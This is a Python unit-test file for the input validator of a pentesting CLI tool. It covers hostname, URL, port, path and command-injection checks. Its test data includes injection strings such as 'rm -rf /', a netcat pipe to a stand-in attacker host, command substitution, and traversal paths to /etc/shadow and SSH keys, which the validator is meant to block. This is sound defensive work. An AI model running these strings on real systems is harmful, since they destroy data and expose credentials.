#!/usr/bin/env python3
"""
Security-focused unit tests for Tajaa CLI v3.1.0
Tests command injection prevention, hostname validation, URL normalization, etc.
"""

import unittest
from io import StringIO
from main import InputValidator
from rich.console import Console


class TestSecurityFeatures(unittest.TestCase):
    """Test security enhancements in version 3.1.0"""

    def setUp(self):
        """Create validator for testing"""
        self.console = Console(file=StringIO(), legacy_windows=False)
        self.validator = InputValidator(self.console)

    # ========================================================================
    # Hostname Validation Tests
    # ========================================================================

    def test_validate_hostname_valid(self):
        """Test validation of valid hostnames"""
        valid_hostnames = [
            "example.com",
            "subdomain.example.com",
            "test-server.local",
            "scanme.nmap.org",
            "target.htb",
            "machine01.corp.example.com",
            "web-01.example.com",
            "test_server.local",
        ]

        for hostname in valid_hostnames:
            is_valid, error = self.validator.validate_hostname(hostname)
            self.assertTrue(is_valid, f"Hostname '{hostname}' should be valid. Error: {error}")
            self.assertIsNone(error)

    def test_validate_hostname_invalid(self):
        """Test validation of invalid hostnames"""
        invalid_hostnames = [
            "-invalid.com",  # Starts with hyphen
            "exa mple.com",  # Contains space
            "test;whoami",  # Shell metacharacter
            "../etc/hosts",  # Path traversal
            "a" * 254 + ".com",  # Too long (>253 chars)
        ]

        for hostname in invalid_hostnames:
            is_valid, error = self.validator.validate_hostname(hostname)
            self.assertFalse(is_valid, f"Hostname '{hostname}' should be invalid")
            self.assertIsNotNone(error)

    def test_validate_ip_or_hostname_accepts_both(self):
        """Test that IP or hostname validation accepts both types"""
        valid_targets = [
            "192.168.1.1",  # IPv4
            "10.0.0.1",  # IPv4
            "example.com",  # Hostname
            "scanme.nmap.org",  # Hostname
            "target.htb",  # HTB-style hostname
        ]

        for target in valid_targets:
            is_valid, error = self.validator.validate_ip_or_hostname(target)
            self.assertTrue(is_valid, f"Target '{target}' should be valid. Error: {error}")
            self.assertIsNone(error)

    # ========================================================================
    # URL Normalization Tests
    # ========================================================================

    def test_validate_url_normalization(self):
        """Test URL normalization for various inputs"""
        test_cases = [
            # (input, expected_output)
            ("example.com", "http://example.com"),
            ("http://example.com", "http://example.com"),
            ("https://example.com", "https://example.com"),
            ("http://http://example.com", "http://example.com"),  # Duplicate protocol
            ("https://https://example.com", "https://example.com"),  # Duplicate protocol
            ("http://example.com/path", "http://example.com/path"),
            ("https://example.com:8080/api", "https://example.com:8080/api"),
        ]

        for input_url, expected_output in test_cases:
            is_valid, error, normalized = self.validator.validate_url(input_url)
            self.assertTrue(is_valid, f"URL '{input_url}' should be valid. Error: {error}")
            self.assertEqual(normalized, expected_output,
                           f"URL '{input_url}' should normalize to '{expected_output}', got '{normalized}'")

    def test_validate_url_invalid(self):
        """Test URL validation rejects invalid URLs"""
        invalid_urls = [
            "htp://example.com",  # Typo in protocol
            "not a url",  # Not a URL
            "ftp://example.com",  # Wrong protocol
        ]

        for url in invalid_urls:
            is_valid, error, normalized = self.validator.validate_url(url)
            self.assertFalse(is_valid, f"URL '{url}' should be invalid")

    # ========================================================================
    # Command Injection Prevention Tests
    # ========================================================================

    def test_check_dangerous_input_detects_threats(self):
        """Test detection of dangerous shell characters"""
        dangerous_inputs = [
            "test; rm -rf /",  # Command chaining
            "test && whoami",  # Command chaining
            "test | nc attacker 1234",  # Pipe
            "test `whoami`",  # Backtick substitution
            "test $(uname -a)",  # Command substitution
            "test & background",  # Background execution
            "../../../etc/passwd",  # Directory traversal
            "test > /dev/null",  # Redirect
            "test{evil}",  # Braces
        ]

        for dangerous_input in dangerous_inputs:
            is_safe, warning = self.validator.check_dangerous_input(dangerous_input, "test_param")
            self.assertFalse(is_safe, f"Input '{dangerous_input}' should be detected as dangerous")
            self.assertIsNotNone(warning)

    def test_check_dangerous_input_allows_safe(self):
        """Test that safe inputs are not flagged"""
        safe_inputs = [
            "wordpress",
            "apache 2.4.49",
            "CVE-2021-44228",
            "test-value",
            "test_value",
            "TestValue123",
            "192.168.1.1",
            "example.com",
        ]

        for safe_input in safe_inputs:
            is_safe, warning = self.validator.check_dangerous_input(safe_input, "test_param")
            self.assertTrue(is_safe, f"Input '{safe_input}' should be safe. Warning: {warning}")
            self.assertIsNone(warning)

    # ========================================================================
    # File Path Validation Tests
    # ========================================================================

    def test_validate_file_path_blocks_traversal(self):
        """Test that directory traversal is blocked"""
        traversal_paths = [
            "../../../etc/passwd",
            "../../etc/shadow",
            "../../../root/.ssh/id_rsa",
        ]

        for path in traversal_paths:
            is_valid, error = self.validator.validate_file_path(path)
            self.assertFalse(is_valid, f"Path '{path}' should be blocked")
            self.assertIn("traversal", error.lower())

    def test_validate_file_path_rejects_nonexistent(self):
        """Test that non-existent files are rejected"""
        is_valid, error = self.validator.validate_file_path("/nonexistent/file/path.txt")
        self.assertFalse(is_valid)
        self.assertIn("not found", error.lower())

    # ========================================================================
    # Port Validation Tests
    # ========================================================================

    def test_validate_port_valid(self):
        """Test validation of valid port numbers"""
        valid_ports = ["1", "80", "443", "8080", "65535"]

        for port in valid_ports:
            is_valid, error, port_num = self.validator.validate_port(port)
            self.assertTrue(is_valid, f"Port {port} should be valid")
            self.assertIsNone(error)
            self.assertIsNotNone(port_num)

    def test_validate_port_invalid(self):
        """Test validation of invalid port numbers"""
        invalid_ports = [
            ("0", "out of range"),  # Too low
            ("70000", "out of range"),  # Too high
            ("-1", "out of range"),  # Negative
            ("abc", "integer"),  # Not a number
            ("80.5", "integer"),  # Float
        ]

        for port, expected_error_fragment in invalid_ports:
            is_valid, error, port_num = self.validator.validate_port(port)
            self.assertFalse(is_valid, f"Port {port} should be invalid")
            self.assertIsNotNone(error)
            self.assertIn(expected_error_fragment.lower(), error.lower())

    # ========================================================================
    # Input Sanitization Tests
    # ========================================================================

    def test_sanitize_input_strips_whitespace(self):
        """Test that input sanitization removes leading/trailing whitespace"""
        test_cases = [
            ("  example.com  ", "example.com"),
            ("\ttarget\t", "target"),
            ("\nvalue\n", "value"),
            ("  spaced value  ", "spaced value"),
        ]

        for input_val, expected in test_cases:
            sanitized = self.validator.sanitize_input(input_val)
            self.assertEqual(sanitized, expected)


class TestShellSafetyIntegration(unittest.TestCase):
    """Integration tests for shell command safety"""

    def test_shlex_quote_integration(self):
        """Test that shlex.quote properly escapes dangerous inputs"""
        import shlex

        dangerous_inputs = [
            "wordpress; rm -rf /",
            "test && whoami",
            "test | nc attacker 1234",
            "test `whoami`",
            "test $(uname -a)",
        ]

        for dangerous in dangerous_inputs:
            quoted = shlex.quote(dangerous)
            # Quoted strings should be wrapped in single quotes
            # and safe for shell execution as literal strings
            self.assertTrue(quoted.startswith("'") or not any(c in dangerous for c in ";|&`$"))


class TestRealWorldScenarios(unittest.TestCase):
    """Test real-world penetration testing scenarios"""

    def setUp(self):
        """Create validator for testing"""
        self.console = Console(file=StringIO(), legacy_windows=False)
        self.validator = InputValidator(self.console)

    def test_htb_machine_targets(self):
        """Test HackTheBox-style machine names"""
        htb_machines = [
            "lame.htb",
            "legacy.htb",
            "optimum.htb",
            "jerry.htb",
        ]

        for machine in htb_machines:
            is_valid, error = self.validator.validate_ip_or_hostname(machine)
            self.assertTrue(is_valid, f"HTB machine '{machine}' should be valid")

    def test_local_network_targets(self):
        """Test local network hostnames"""
        local_targets = [
            "kali.local",
            "windows10.local",
            "ubuntu-server.local",
            "dc01.corp.local",
        ]

        for target in local_targets:
            is_valid, error = self.validator.validate_ip_or_hostname(target)
            self.assertTrue(is_valid, f"Local target '{target}' should be valid")

    def test_web_app_urls(self):
        """Test common web application URL patterns"""
        web_urls = [
            "http://example.com",
            "https://api.example.com/v1",
            "http://192.168.1.100:8080",
            "https://secure.example.com/login",
            "http://test.example.com/admin/",
        ]

        for url in web_urls:
            is_valid, error, normalized = self.validator.validate_url(url)
            self.assertTrue(is_valid, f"Web URL '{url}' should be valid")

    def test_searchsploit_queries(self):
        """Test typical SearchSploit search terms"""
        search_terms = [
            "apache 2.4.49",
            "wordpress 5.8",
            "CVE-2021-44228",
            "log4j",
            "eternal blue",
            "MS17-010",
        ]

        # These should not trigger dangerous input warnings (except if shell chars added)
        for term in search_terms:
            is_safe, warning = self.validator.check_dangerous_input(term, "search_term")
            self.assertTrue(is_safe, f"Search term '{term}' should be safe")


if __name__ == '__main__':
    # Run tests with verbose output
    unittest.main(verbosity=2)

